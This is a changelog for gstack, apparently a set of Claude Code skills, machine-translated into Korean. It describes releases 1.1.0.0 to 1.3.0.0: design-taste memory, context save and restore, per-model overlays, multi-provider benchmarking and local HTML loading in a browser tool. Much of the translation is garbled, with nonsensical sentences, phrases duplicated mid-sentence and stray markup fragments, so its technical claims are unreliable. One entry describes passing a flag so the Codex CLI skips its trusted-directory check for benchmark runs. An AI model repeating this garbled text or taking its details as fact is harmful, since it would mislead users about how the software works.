- 새로운 결의자 `{{MAKE_PDF_SETUP}}`는 `$B`: `MAKE_PDF_BIN` env override, 그 후에 국부적으로 기술 뿌리, 그 후에 세계적인 설치, 그 후에 PATH와 동일한 발견 순서를 가진 `$P=` 별명으로 방출합니다.
- 결합 기능 복사 파스 게이트는 `make-pdf/test/e2e/combined-gate.test.ts`에서 P0 테스트입니다. 기능 게이트는 P1 진단입니다.
- 4단계: Paged.js를 정확하게 TOC 페이지 수를 위한 납품업자 highlight.js를, 하락 모자, pull 따옴표, CMYK 안전한 변환, 2 열간 배치를 위한 공급된 highlight.js.
- Preamble bash는 이제 `_EXPLAIN_LEVEL`와 `_QUESTION_TUNING`를 방출하여 다운스트림 기술을 런타임에 읽을 수 있습니다. 경기에 업데이트 된 골든 파일 고정 장치.

## [1.3.0.0] - 2026-04-19

## **당신의 디자인 기술은 당신의 맛을 배우.** ## **세션 상태는 당신이 grep 할 수있는 파일이됩니다, 검은 상자가 아닙니다.**

v1.3은 매일 할 것들에 대해입니다. `/design-shotgun` 이제는 글꼴, 색상 및 세션 전반에 걸쳐 응용 프로그램을 배치하는 것을 기억하므로, 다음의 변형이 각 시간마다 상호로 다시 설정 대신 실제 맛을 향해 느립니다. `/design-consultation`에는 "인간 디자이너가이에 의해 embarrasssed?"라는 단어가 있으며, "어떤 사람이 기억할 것입니까?"라는 단어가 단계 1의 질문을 강제로 "/ph/>는 출력되기 전에 출력됩니다. `/context-save`와 `/context-restore`는 `~/.gstack/projects/$SLUG/checkpoints/`의 일반 문자로 세션 상태를 작성하고, 기계 사이에서 읽고 편집하고 이동할 수 있습니다. 연속 체크포인트 모드(`gstack-config set checkpoint_mode continuous`)에 플립하고 `WIP:`를 떨어뜨릴 수도 있습니다. Claude Code는 이미 자신의 세션 상태를 관리하고, 이것은 당신이 소유한 형식으로 병렬 트랙입니다.

### 중요 한 숫자

설정: 이 v1.3 기능 표면에서 온다. `grep "Generate a different" design-shotgun/SKILL.md.tmpl`, `ls model-overlays/`, `cat bin/gstack-taste-update`를 통해 재교육 가능, `gstack-config get checkpoint_mode` 런타임 배선에 대 한.

| Metric                                           | BEFORE v1.3                 | AFTER v1.3                              | Δ           |
|--------------------------------------------------|------------------------------|-----------------------------------------|-------------|
| **설계-variant 융합 게이트**              | no 필요조건               | **3 축** (font + 팔레트 + 레이아웃은 다를 수 있습니다) | **+3**  |
| **AI-slop 글꼴 블랙리스트**                       | ~8개의 글꼴                     | **10+** (기본적으로 추가된 공간 Grotesk, 체계 -ui) | **+2+** |
| **`/design-shotgun` 라운드의 맛 메모리** | none                         | **프로젝트 JSON, 5%/wk 감퇴**       | **의 새로운**     |
| **세션 상태 형식**                         | Claude Code의 불투명 세션 스토어 | **markdown in `~/.gstack/` by default, plus `WIP:` git commits if you opt into continuous mode** (파렐 트랙) | **의 새로운** |
| **`/context-restore` 소스**                   | Markdown 파일만          | **WIP에서 markdown + `[gstack-context]`는 투입합니다** | **+1** |
| **행동 오버레이를 가진 모형**              | 1 (Claude 불용성)          | **5** (클래드, gpt, gpt-5.4, gemini, o-series) | **+4** |

단일 가장 눈에 띄는 행 : 세션 상태는 검은 상자가되는 중지합니다. Claude Code의 내장 세션 관리는 자체 측면에서 잘 작동하지만 `grep`이 아니라 다른 도구로 읽을 수 없습니다. `/context-save`는 `~/.gstack/projects/$SLUG/checkpoints/`에 표시되어 모든 편집기에서 열 수 있습니다. 연속 모드 (opt-in)도 `WIP:` 구조 `[gstack-context]`체를 사용하여 구조화 된 `[gstack-context]`를 사용하여 전체 스레드를 보여줍니다. 어떤 방법, 당신이 소유하지 않는 일반 텍스트.

### gstack 사용자를 위한 이 뜻은 무엇입니까

개인 빌더 또는 설립자가 시간에 제품 하나 스프린트를 배송하는 경우, `/design-shotgun`는 동시에 동일한 네 개의 변형을 동시에 핸딩하고 당신이 선택 한 학습을 시작합니다. `/design-consultation`는 Inter + Grey + Rounded-corners와 기본적으로 중지하고 "잊을 수없는 것은 무엇입니까?"에 응답하기 위해 힘차게됩니다. `/context-save` 및 `/context-restore`는 default, 그리고 git commits if you opt into 연속 모드로. 다른 도구로 손이 작동하거나, 실제로 결정한 것을 검토해야 할 때, 당신은 파일을 열거나 `git log`를 읽습니다. `/gstack-upgrade`를 실행하고, 다음 페이지에 `/design-shotgun`를 시도하십시오. 이 페이지는, 그 다음 페이지의 입력을 시작으로, 그리고, 그 후에 엔진을 시작해서, 이렇게, 엔진을 시작하게 하고, 이렇게, 이렇게, 그리고 `/design-shotgun`를 읽습니다.

### 항목화 된 변경

### 추가

#### AI처럼 멈춰지는 디자인 기술

- **반대로 사면 디자인 constraints.** `/design-consultation`는 이제 "하나의 누군가가 기억할 것"이라고 묻습니다. 1 단계의 질문을 강제로 "인간 디자이너가 이에 의해 embarrased"를 실행합니까? 5 단계의 자체 게이트는 불멸하고 재생됩니다. `/design-shotgun`는 항-convergence 지시를 가져옵니다. 각 변종은 다른 글꼴, 팔레트 및 레이아웃을 사용해야하며, 또는 그 중 하나는 실패했습니다. Groktes는 "in-safe-font"에 추가되었습니다. `system-ui` AI-slop blacklist에 추가된 1차 글꼴로 `system-ui`.
- **디자인 맛 엔진.** `/design-shotgun`의 승인과 거부는 `~/.gstack/projects/$SLUG/taste-profile.json`의 지속적 per-project 맛 프로파일에 기록됩니다. 글꼴, 색상, 레이아웃 및 Laplace-smoothed 자신감을 가진 미적 방향을 추적합니다. 주 당 10 %는 기본 설정 퇴색합니다. `/design-consultation` 및 `/design-shotgun`는 미래 실행에 대한 입증 된 선호도에 두 가지 요인을 모두 사용하여 #3이 달은 당신이 마지막 달과 같은 것을 기억합니다. #1

#### 세션 상태, grep, 이동

- **연속 체크포인트 모드 (선택-in, 로컬 default).** `gstack-config set checkpoint_mode continuous`와 `WIP: <description>` 접두사와 구조화된 `[gstack-context]` 몸 (절개된, 나머지 일, 실패한 접근)를 당신의 프로젝트의 git 로그로 자동 결합하는 힘으로 그 위에 플립하십시오. Claude Code의 붙박이 회의 관리와 default `/context-save` 표방 파일 `~/.gstack/`와 함께 실행하십시오. git-based track은 `git log --grep "WIP:"`를 원할 때 유용합니다. branch의 전체적인 소원 실을 표시하거나, 당신이 파일을 열지 않고 어떤 에이전트이 있었는지 검토하고 싶을 때. 푸시는 `checkpoint_push=true`를 통해 선택됩니다, default는 local-only 이렇게 당신은 실수로 트리거 CI 각 WIP 커밋에.
- **`/context-restore` WIP 커밋을 읽습니다.** Markdown 저장된 텍스트 파일 외에도 `/context-restore`는 현재 branch에서 WIP의 블록을 파열합니다. 구조화 결정과 나머지 작업으로 떠난 곳을 선택할 때, 거기가 있습니다.
- **`/ship` 비파괴 WIP 커밋**를 만들기 전에 PR. `git rebase --autosquash` scoped를 WIP로 사용하십시오만. WIP는 branch에 투입됩니다. 실제 작업을 파괴하는 대신 `BLOCKED` 상태와 충돌에 대한 구색. 그래서 `WIP:`로 야생을 갈 수 있고 아직도 깨끗한 bisectable PR를 발송합니다.

### 질의 생활

- **기능 향상 후에 발견한 신속한.** `JUST_UPGRADED` 불이면 gstack는 사용자가 한 번 새로운 기능을 가능하게 하는 것을 제안합니다 (`~/.gstack/.feature-prompted-{name}`에 특징 감적 파일). 전적으로 스파게드 세션에서 건너 뛰었습니다. No 더 침묵하는 특징은 결코 발견되지 않습니다.
- **컨텍스트 건강 소프트 지침 (T2+ 기술).** 오랜 실행 기술 중 (`/qa`, `/investigate`, `/cso`), gstack 이제는 주기적인 `[PROGRESS]` summaries를 작성할 것을 판결합니다. 원에서 나가는 것을 알면 STOP 및 재조합. 50+ 도구 통화 세션을 위한 각자 훈련. No 가짜 문턱, no 시행. 진행은 결코 gitate 국가를 방해하지 않습니다.

### 크로스 호스트 지원

- **`--model` 플래그를 통해 Per-model 행동 오버레이.** 다른 LLMs 필요 다른 진창. 실행 `bun run gen:skill-docs --model gpt-5.4` 및 모든 생성된 기술은 GPT-tuned 행동 패치를 선택합니다. `model-overlays/`: claude (todo-list 분야), gpt (anti-termination + completeness), gpt-5.4 (anti-verbosity, 상속 gpt), gemini (conciseness), o-series (structuredip), gpt (anti-termination + completeness), gpt-5.4 (anti-verbosity, 상속 gpt), gemini (conciseness), o-series (structuredlays. {model}` 출력에 인쇄하여 어떤 것이 활성화되어 있는지 알 수 있습니다.

#####에 관하여

- **`gstack-config list`와 `defaults`** subcommands. `list`는 현재 값 AND 소스 (user-set vs default)을 가진 모든 구성 열쇠를 보여줍니다. `defaults`는 기본 테이블을 보여줍니다. `get`가 문서화한 기본으로 떨어지는 대신 누락된 열쇠를 위해 빈번한 간격을 고치십시오.
- **`checkpoint_mode`와 `checkpoint_push` 구성 키.** 연속 검수 모드에 대한 새로운 손잡이. default 두 개 모두 안전한 값 (`explicit` 모드, no 자동 진수).

### 힘 사용자/내부

- **`gstack-model-benchmark` CLI + `/benchmark-models` 기술.** Claude, GPT (Codex CLI), 그리고 Gemini 측에 동일한 프롬프트를 실행하십시오. Anthropic SDK 판단 (`--judge`, ~$0.05/run). Per-provider auth 탐지, 가격표, 도구 겸용 지도, 평행한 실행, per-prooler JSON 표시가 없는, JSON 출력표 JSON, 0.05/run). Per-provider auth 탐지, 가격표, 도구 겸용 지도, 평행한 실행, per-provider JSON. `/benchmark-models`는 상호 작용하는 교류 (pick prompt →는 공급자 → 판단 → 달리기 → 해석을 확인하는)에서 CLI를 포장합니다 당신이 vibes 대신에 자료로 나의 `/qa` 기술에 실제로 베스트를 알고 싶은 경우에.

### 변경

- **하위 모듈로 분할.** `scripts/resolvers/preamble.ts`는 18의 발전기 인라인으로 740의 선이었습니다. 이제 `scripts/resolvers/preamble/*.ts`에서 각 발전기를 수입하는 ~100 선 구성 루트입니다. 산출은 모든 호스트의 `diff -r`를 통해 (refactor 후에 모든 호스트의 SKILL.md 파일을 통해 정의됩니다) byte-identical입니다. 정비는 더 쉽습니다: 새로운 프리램블 섹션을 추가하면 이제 "하나의 파일을 생성하고, "하나의 가져오기 라인" 대신 "신 파일에 자리". 또한 메인 v1.1.2 모드 자세와 v1.0 쓰기 스타일 추가를 하위 모듈 (`generate-writing-style.ts`, `generate-writing-style-migration.ts`)로 흡수합니다.
- **안티 슬립 죽은 코드 제거.** `scripts/gen-skill-docs.ts`는 `AI_SLOP_BLACKLIST`, `OPENAI_HARD_REJECTIONS`, `OPENAI_LITMUS_CHECKS`의 중복 사본을 가지고 있었습니다. 삭제된 — `scripts/resolvers/constants.ts`는 지금 단 하나 근원입니다. No 더 많은 편류 위험.
- **25K에서 40K로 모인 토큰 천장.** 기술은 합법적으로 많은 행동을 포장 (`/ship`, `/plan-ceo-review`, `/office-hours`)는 오늘 200K-1M 컨텍스트 창과 신속한 캐싱을 주어진 실제 위험을 반영하는 no가 경고를 여행했다. CLAUDE.md의 지도는 압축 표적 보다는 오히려 "배너 성장을위한 시계" 신호로 천장을 재구성합니다.

### 고정

- **Codex 어댑터는 임시 직원 작업 디렉토리에서 작동합니다.** GPT 어댑터 (`codex exec`)는 이제 `--skip-git-repo-check`를 통과합니다. 비git temp dirs에서 실행되는 벤치 마크는 " 신뢰할 수있는 디렉토리 내부에없는" 오류를 타격합니다. `-s read-only` 안전 경계를 유지하십시오. 플래그는 대화 형 신뢰를 신속하게 건너 뛸 수 있습니다.
- **`--models` 목록 deduplication.** `--models claude,claude,gpt` no를 더 긴 실행 Claude 두 번과 두 배 선행. 세트를 통해 깃발 파서 dedupes는 첫번째 선구적인 순서를 보존하고 있습니다.
- **CI Docker Ubicloud 주자에 빌드.** 두 가지 수정은 branch의 수명 중 결합 : (1)는 NodeSource apt에서 공식 nodejs.org tarball의 직접 다운로드를 설치, Ubicloud 주자부터 정기적으로 archive.ubuntu.com / security.ubuntu.com에 도달 할 수 없었다; (2)는 `tar -xJ`를 `.tar.xz` tarball 실제로 작동에 시스템 deps에 `tar -xJ`를 추가했습니다.

### 기여자

- **멀티 프로바이더 벤치마킹을 위한 테스트 인프라.** `test/helpers/providers/{types,claude,gpt,gemini}.ts`는 기존 CLI 주자 감싸는 획일한 `ProviderAdapter` 공용영역 및 3개의 접합기를 정의합니다. `test/helpers/pricing.ts`에는 각 공급자의 CLI가 붙은 모형 비용 테이블 (일부로)가 있습니다. `test/helpers/tool-map.ts`는 각 공급자의 CLI가 노출하는 것을 선언합니다 - Edit/Glob/Grep가 올바르게 Gemini를 건너뛰고 `unsupported_tool`를 보고하는 벤치 마크.
- **중립 `scripts/models.ts`의 모델 세분화.** `Model`가 `scripts/resolvers/types.ts`에서 살았던 경우에 일어난 `hosts/index.ts`를 통해 수입 주기를 피하십시오. `resolveModel()`는 가족 heuristics를 취급합니다: `gpt-5.4-mini` → `gpt-5.4`, `o3` → `o-series`, `claude-opus-4-7` → `claude`.
- **`scripts/resolvers/preamble/`** — 18개의 단일용 발전기, 각 16-160개의 선. `scripts/resolvers/preamble.ts`에 있는 구성 뿌리는 그(것)들을 수입하고 층별 단면도 명부로 그(것)들을 타전합니다.
- **계획 및 리뷰 지속.** 구현은 `~/.claude/plans/declarative-riding-cook.md` (SCOPE EXPANSION, 6 확장 허용), DX (POLISH, 5개의 간격 고정), Eng review (4개의 건축 문제점) 및 Codex 검토 (11개의 잔인한 발견, 모든 통합 및 2개의 이전 결정 반전된)를 통해서 갔다는 `~/.claude/plans/declarative-riding-cook.md` 실행을 따릅니다.
- **쓰기 스타일 규칙에 있는 형태 자세 에너지 2-4** (주요 v1.1.2.0에서 포트). 규칙 2 및 규칙 4 이제는 3개의 훈제를 커버합니다 - 고통 감소, 기능 자물쇠로 열리고, forcing-question 압력 — 그래서 확장, 건축업자, 및 forcing-question 기술은 진단 파인 튀기로 콜라주 대신 그들의 가장자리를 지킵니다. 규칙 3는 겹쳐 쌓이는 질문을 위한 표정을 추가합니다. <1/ph>를 통해 안으로 캠; 이미 v1.3.1.3에서 발송된 v1.3.1.3에 있는 이하 앉으십시오.
- **라이트 E2E v1.3 primitives에 대한 적용.** 3개의 새로운 시험 파일 fill 처음 검토에서 실제 적용 간격 떨어뜨리십시오: `test/taste-engine.test.ts` (24 tests — schema shape, Laplace-smoothed confidence, 5%/week decay clamped at 0, multi-dimension extraction, case-insensitive first-casing-wins policy, session cap via seed-then-one-call, legacy profile migration, taste-drift conflict warning, malformed-JSON recovery), `test/benchmark-cli.test.ts` (12 tests — CLI flag wiring, provider defaults, unknown-provider WARN path, NOT-READY branch regression catcher that strips auth env vars), `test/skill-e2e-benchmark-providers.test.ts` (8 periodic-tier live-API tests — trivial "echo ok" prompt through claude/codex/gemini adapters, assertions on parsed output + tokens + cost + timeout error codes + Promise.allSettled parallel isolation).
- **3개의 주인을 위한 황금 정착물을 발송하십시오.** `test/fixtures/golden/{claude,codex,factory}-ship-SKILL.md` - `/ship` 생성된 산출에 바이트 정확한 회귀 핀. /review 도중 adversarial subagent 통행은 merge의 앞에 2개의 진짜벌레를 붙잡었습니다: 맛 엔진에 있는 Geist/GEIST 케이싱 정책은 불이 켜져 있고, 살아있는 E2E workdir는 단위 짐에 창조되고 결코 청소되지 않았습니다.

## [1.1.3.0] - 2026-04-19

### 변경
- **`/checkpoint`는 `/context-save` + `/context-restore`입니다.** Claude Code는 gstack 기술 그림자인 현재 환경에 있는 기본 되감기 별명으로 `/checkpoint`를 대우합니다. 증상: 당신은 유형 `/checkpoint`, 에이전트은 당신이 직접 유형해야 하는 "붙박이에서 그것을 설명할 것입니다," 및 아무것도 저장될 것입니다. 고침은 청결한 이름이고 2개의 기술로 나누는 것입니다. 저장하는 것, 그 회복하는 것. 당신의 오래된 저장한 파일은 아직도 (> 5개)를 통해 아직도 (>를 통해) 로드합니다.
  - `/context-save`는 현재 근무 국가 (선택적인 제목: `/context-save wintermute`)를 저장합니다.
  - `/context-save list` 목록은 상황에 저장했습니다. 현재 branch에 과태; 각 branch를 위한 `--all`를 통과하십시오.
  - `/context-restore`는 ALL 분기마다 가장 최근 저장된 컨텍스트를 로드합니다. 이 수정은 이전 `/checkpoint resume` 스트레인이 목록 흐름 필터링과 함께 교차 오염을 얻고 가장 최근의 저장을 침묵적으로 숨깁니다.
  - `/context-restore <title-fragment>`는 특정한 저장된 상황에 적재합니다.
- **주문 복원은 이제 결정적입니다.** "최근의 가장 최근"는 파일명에 `YYYYMMDD-HHMMSS` 접두사, 파일 시스템의 매번을 의미한다. 복사 및 rsync 중의 매번 드립트; 파일명은 하지 않습니다. 복원 및 목록 흐름 모두에 적용.

### 고정
- **macOS의 빈 세트 버그.** 0개의 파일과 `find ... | xargs ls -1t` (현재 `/context-restore`)를 ran `/checkpoint resume` 를 떨어뜨릴 경우, `find ... | xargs ls -1t` 는 현재 디렉토리를 나열하기 위하여 다시 떨어질 것입니다. 산출을 혼란시키면 no는 “no 저장된 컨텍스트를 아직” 메시지가 붙습니다. `find | sort -r | head`로 대체해, 빈 입력은 빈 체재를 체재합니다.

### 기여자
- New `gstack-upgrade/migrations/v1.1.3.0.sh` removes the stale on-disk `/checkpoint` install so Claude Code's native `/rewind` alias is no longer shadowed. Ownership-guarded across three install shapes (directory symlink into gstack, directory with SKILL.md symlinked into gstack, anything else). User-owned `/checkpoint` skills preserved with a notice. Migration hardened after adversarial review: explicit `HOME` unset/empty guard, `realpath` with python3 fallback, `rm --` flag, macOS sidecar handling.
- `test/migration-checkpoint-ownership.test.ts`는 모든 3개의 설치 모양 + idempotency + no-op-when-gstack-not-installed + SKILL.md-symlink-outside-gstack를 덮는 7개의 시나리오를 발송합니다. 자유로운 층, ~85ms.
- `checkpoint-save-resume` E2E `context-save-writes-file`와 `context-restore-loads-latest`로 나누십시오. 후자는 스크램블 된 mtimes를 가진 2개의 파일을 etc로 “filename-prefix, mtime” 보증이 잠겨 있지 않습니다.
- `context-save` 이제 LLM-side slugification을 신뢰하는 대신 bash (allowlist `[a-z0-9.-]`, 모자 60 chars)의 제목을 만족시키고, 부과 계약에 따라 동일한 두 번째 충돌에 무작위 스프릭스를 추가합니다.
- `context-restore`는 10k+ 저장된 파일로 20개의 가장 알맞은 항목에 파일명 목록으로 만들기를 모자를 씌우는 것은 컨텍스트 창을 불어넣지 않습니다.
- `test/skill-e2e-autoplan-dual-voice.test.ts`는 주요 (잘못된 `runSkillTest` 선택권 이름, 잘못된 결과 필드 접근, 잘못된 돕기 서명, 누락된 Agent/Skill 도구)에 끊겼습니다. 조정 끝 최후에: 1/1는 첫번째 시도, $0.68, 211s에 통행. 음성 탐지 regexes는 지금 JSON 모양 tool_use 입장 및 단계 completion 감적, 바느질합니다 신속한 원본 언급 일치합니다.
- `test/skill-e2e-context-skills.test.ts`의 8개의 라이브파이 E2E 테스트를 추가했습니다. `claude -p`는 기술 툴을 활성화하고 여정 경로에 assert를 가진 E2E를, 손으로 먹이는 단면도 프롬프트 저장합니다. 덮개: routing, 득점 그 후에 복원 둥근 지구, 조각 잡아당기기 회복, 빈 상태 우아한 메시지, `/context-restore list`를 `/context-save list`, 유산 파일 compat, branch 여과기 default, 깃발 및 깃발을 저장하십시오. 21 추가 프리 계층 경화 테스트 `test/context-save-hardening.test.ts` 제목 - 산화기 allowlist, 충돌 안전 파일명, 빈 세트 낙하 및 마이그레이션 HOME 가드.
- `test/skill-collision-sentinel.test.ts` — 업스트림 슬래시-command 그림자에 대한 보험 정책. 알려진 내장 슬래시 명령의 per-host 목록에 대한 모든 gstack 기술 이름과 크로스 체크를 모두 포함 (23 Claude Code 내장 추적). 호스트가 새로운 내장 된 경우, `KNOWN_BUILTINS`에 추가하고 사용자가 그것을 찾을 수 전에 충돌을 테스트 플래그를 추가하십시오. `/review` 충돌 Claude Code `KNOWN_COLLISIONS_TOLERATED` 문서와 `KNOWN_COLLISIONS_TOLERATED`; 문서와 함께 `KNOWN_COLLISIONS_TOLERATED`; 예외 목록은 모든 실행에 라이브 기술에 대해 검증됩니다. 그래서 stale 항목은 크게 실패합니다.
- `runSkillTest` 에서 `test/helpers/session-runner.ts` 이제는 시험 env overrides를 위한 `env:` 선택권을 받아들입니다. 시험은 기술 도구를 우회하기 위하여 에이전트을 일으키는 원인이 된 프롬프트로 `GSTACK_HOME=...`를 갖는 것을 가지고 갖는 것을에서 시험합니다. 모든 8개의 새로운 E2E 시험 사용 `env: { GSTACK_HOME: gstackHome }`.

## [1.1.2.0] - 2026-04-19

### 고정
- **`/plan-ceo-review` SCOPE EXPANSION 모드는 만료됩니다.** CEO 큰 꿈을 위해 검토를 요청하면 제안은 건조한 특징 탄알로 움직여 ("실시간 알림을 추가하십시오. Y%에 의해 보존을 개선하십시오. V1 쓰기 작풍 규칙은 진단 파인 프라이밍으로 각 outcome를 훔쳤습니다. 규칙 2와 규칙 4 공유된 전술에서 지금 3개의 튀기는 덮습니다: 고통 감소, 기능 자물쇠로 여는, 그리고 forcing-question 압력. 교회 언어는 1개의 선을 위한, 1개의 선을 얻습니다.
- **`/office-hours`는 가장자리를 지킵니다.** 시작 모드 Q3 (특성)는 "Who는 당신의 목표 사용자?"로 콜라주를 멈추지 않았습니다. 현재 질문은 3 개의 압력, 아이디어의 도메인에 일치 - 소비자를위한 경력을 미치는 영향, 주말 프로젝트는 취미 및 오픈 소스에 잠금 해제. 빌더 모드는 야생을 유지 : "당신은 또한 ..."방사 및 인접한 잠금 해제는 다음과 같습니다. PRD 태그로드 기능.

### 추가
- **Gate-tier eval 테스트는 각 PR에 모드 자세 회귀를 잡습니다.** 공유된 전방, 계획-ceo-review Template, 또는 사무실 시간 템플릿 변경 때 3개의 새로운 E2E 테스트 화재. Sonnet 판단은 두 개의 축에 각 모드를 점수합니다. 확장, 스택-pressure 대 도메인-유형-소비, 건축가를위한 예기치 않은-대 흥분-오버-optimization 대 결정에 대한 결정-보정을 느꼈습니다. 원래 V1 회귀는 아무것도 출하하지 않습니다. 이 간격이 틈새가 떨어질 때까지 이 손상을 입었습니다.

### 기여자
- Writing Style rule 2 and rule 4 in `scripts/resolvers/preamble.ts` 각 3 쌍의 framing 예제를 대신합니다. 규칙 3은 겹쳐 쌓이는 질문을 위한 명시적인 예외를 추가합니다.
- `plan-ceo-review/SKILL.md.tmpl` SCOPE EXPANSION SELECTIVE EXPANSION 에 의해 공유된 새로운 `### 0D-prelude. Expansion Framing` subsection를 가져옵니다.
- `office-hours/SKILL.md.tmpl`는 exemplar (Q3)와 야생 exemplar (빌더 운영 원리)를 강제로 인라인을 가져옵니다. 안정된 두드리기에 의해 고정되는, 번호 선을 답니다.
- `judgePosture(mode, text)` 의 도움자 `test/helpers/llm-judge.ts` (Sonnet 판단, 형태 당 이중 축선 윤활유).
- `test/fixtures/mode-posture/`의 세 가지 시험 정착물 - 확장 계획, 간격 피치, 빌더 아이디어.
- `E2E_TOUCHFILES` + `E2E_TIERS`: `plan-ceo-review-expansion-energy`, `office-hours-forcing-energy`, `office-hours-builder-wildness`에 등록된 3개의 항목은 — 모든 `gate` 층을 층계합니다.
- 이 branch에 대한 검토 역사: CEO 검토 (HOLD SCOPE) + Codex 계획 검토 (30개의 발견, "새로운 규칙을 추가하는 #5 과도한"에서 "rewrite 규칙 2-4 예"에 접근하는 접근을 몰기하십시오. eng 검토 통행은 시험 infrastructure 표적을 붙잡았습니다 (원래적으로 `test/skill-llm-eval.test.ts`에, 이는 정체되는 분석 — 실제로 E2E를 필요로 합니다).

## [1.1.1.0] - 2026-04-18

### 고정
- **`/ship` no 더 긴 침묵하게 `VERSION`와 `package.json` 편류를 시켰습니다.** 이 수정하기 전에 `/ship`의 단계 12는 `VERSION` 파일만 읽고 범람했습니다. `package.json` (registry UIs, `bun pm view`, `npm publish`, 미래 돕기)를 읽는 어떤 하류 소비자는 stale semver를, 그리고 혼자 `VERSION`에 열쇠가 되는 때문에, 다음 `/ship`는 그것을 무인하게 검출할 수 없었습니다. 이제 단계 12는 4개의 주로 분류합니다 — FRESH, ALREADY_BUMPED, DRIFT_STALE_PKG, DRIFT_UNEXPECTED — 각 방향에 있는 편류를 검출하고, 두 배 범프를 할 수 없는 sync-only 경로를 통해 그것을, 그리고 `VERSION` 및 `package.json`가 주위 방법에 있는 불쾌한 방법을 통해 halts.
- **malformed version strings에 대해 강하게 합니다.** `NEW_VERSION`는 어떤 쓰기 전에 4 자리 semver 본에 대하여 유효하, 그리고 drift 수선 경로는 `package.json`로 전파하기 전에 `VERSION` 내용에 동일한 체크를 적용합니다. Trailing 포가 반환과 whitespace는 둘 다 파일에서 읽습니다. `package.json`가 <validJSON인 경우에, `/ship`는 침묵하게 손상된 파일에 따라서 확고하게 멈추지 않습니다.

### 기여자
- `test/ship-version-sync.test.ts`의 새로운 테스트 파일 - 새로운 단계 12 논리의 각 branch를 포함하는 14개의 케이스는, 긴요한 no-double-bump 경로 (drift-repair는 정상적인 범람 활동을 결코 칭해야 합니다)를 포함하여, trailing-CR 회귀, 및 무효하 semver 수선 거절을 포함하여.
- 이 수정에 대한 검토 역사 : `/plan-eng-review`, `/codex` 계획 검토의 한 라운드 (원래 디자인에 이중 범 버그를 설립), Claude adversarial subagent (확장 CRLF 처리 간격과 비효율 `REPAIR_VERSION`)의 한 라운드. 모든 표면 문제에서 적용.

## [1.1.0.0] - 2026-04-18

### 추가
- **검색은 HTTP 서버가 없는 로컬 HTML를 렌더링할 수 있습니다.** 두 가지 방법: `$B goto file:///tmp/report.html`는 로컬 파일로 이동 (cwd-relative `file://./x` 및 홈-relative `file://~/x` 형태, 스마트 패딩 그래서 당신은 URL 문법에 대해 생각하지 않아도됩니다), 또는 `$B load-html /tmp/tweet.html`는 파일을 읽고 `page.setContent()`를 통해로드합니다. 둘 다 scoped에서 cwd + temp dir for safety. 만약 당신이 migte-HTML를 생성하는 경우, 이것은 HTML를 생성하는 것이 plcwd+에 있는 scoped를 생성합니다.
- **원치 않는 플래그와 요소 스크린 샷.** `$B screenshot out.png --selector .card`는 이제 단일 요소 스크린 샷을 할 수있는 비공식적인 방법입니다. Positional selectors는 여전히 작동하지만, `button`와 같은 태그 선택자는 위치적으로 인식되지 않았으므로 flag form fixes that. `--selector` `--base64`와 `--clip`와 함께 구성하고 `--clip` (초당 하나)를 거부합니다.
- **`--scale`를 통해 망막 스크린 샷.** `$B viewport 480x2000 --scale 2`는 `deviceScaleFactor: 2`를 놓고 화소 두 배 스크린을 일으킵니다. `$B viewport --scale 2` 혼자서 가늠자 요인을 바꾸고 현재 크기를 지킵니다. 가늠자는 1-3 (gstack 정책)에 capped. Headed 형태는 실제 브라우저 창에 의해 통제되는 시점부터 깃발을 거부합니다.
- **Load-HTML 내용이 스케일 변경을 살아남습니다.** `--scale`는 브라우저 컨텍스트를 재구축합니다 (Playwright가 작동하는 방법), 이전에 `load-html`를 통해 로드된 페이지를 닦아 낼 것입니다. 이제 HTML는 탭 상태에 캐시되어 새 컨텍스트로 자동으로 재생됩니다. 메모리만; 디스크에 얽힌 적이 없습니다.
- **SKILL.md의 속임수표 검색** Puppeteer API의 사이드 바이 사이드 테이블은 명령을 검색하고, 전체 작업 예 (트위터 흐름 : viewport + Scale + Load-html + Element 스크린 샷)을 검색합니다.
- **Guess-friendly 별명으로.** 유형 `setcontent` 또는 `set-content` 그리고 `load-html`에 노선. Canonicalization는 범위 체크의 앞에 일어나, 그래서 읽은 장면 토큰은 우회 쓰기-경구적인 강제로 별명을 사용할 수 없습니다.
- **`Did you mean ...?` 알 수없는 명령.** `$B load-htm`는 `Unknown command: 'load-htm'. Did you mean 'load-html'?`를 돌려줍니다. 거리 2, 입력 길이 ≥ 4에 문질러에 문질러는 소음을 일으키지 않습니다.
- **`load-html`에 부자, 실행 가능한 오류.** 모든 거부 경로 (파일을 찾을 수 없습니다, 디렉토리, 과크기, 외부 안전 디서, 바이너리 콘텐츠, 프레임 컨텍스트) 입력을 의미, 원인을 설명, 그리고 다음을 수행 말한다. 확장 allowlist `.html/.htm/.xhtml/.svg` + 마술 바이트 스프라이트 (UTF-8 BOM 스트립) 쓰레기를 렌더링하기 전에 잘못 이름이 궤양을 잡는다.

## 보안
- `file://` 내비게이션은 `goto`, scoped에서 기존 `validateReadPath()` 정책을 통해 cwd + temp dir에 허용된 계획입니다. UNC/network 호스트 (`file://host.example.com/...`), IP 호스트, IPv6 호스트, Windows 드라이브-letter 호스트는 명시된 오류로 모든 거부됩니다.
- **국가 파일은 no 더 긴 smuggle HTML 내용 할 수 있습니다.** `state load`는 이제 `load-html`의 안전한 디디렉션, 확장 allowlist, 마술 바이트 스프라이트 또는 크기 캡 체크를 우회할 수 없는 필드에 `loadedHtml`를 명시적으로 `load-html`의 allowlist를 사용하도록 합니다. 탭 소유권은 동일한 인 메모리 채널을 통해 컨텍스트 레크리에이션을 통해 보존되며, scoped의 `viewport --scale`의 `viewport --scale`가 잃을 수 있는 교차 시 권한이 종료됩니다.
- **감사 로그는 이제 원시 별명을 입력합니다.** `setcontent`를 입력하면 감사 입장은 `cmd: load-html, aliasOf: setcontent`를 보여주므로 법정 흔적은 실제로 전송되는 것을 반영하여 운하 형태가 아닌.
- **`load-html` 모든 실제 내비게이션에 제대로 명확하게** - 링크 클릭, 양식 제출, 그리고 JavaScript 리프레시 메타데이터를 명시 `goto`/`back`/`forward`/`reload` 같이 다시 재생할 수 있습니다. click가 `viewport --scale`가 `load-html` 내용 (silent data corruption)을 다시 재검출할 수 있는 후 나중에 `viewport --scale`가 수정됩니다. SPA 고정 URL: `goto file:///tmp/app.html?route=home#login`는 문자열을 통해 정상적인 문자열을 보존하고, 정상적인 문자열을 통해 `load-html`를 보존합니다.

### 기여자
- `validateNavigationUrl()`는 이제 정상화 된 URL (이전의 비폭)를 반환합니다. 모든 4 명의 콜러버 - goto, diff, newTab, restoreState — 반환 값이 소똑하게 파산하는 것을 모든 탐색 사이트에서 효과가 발생합니다.
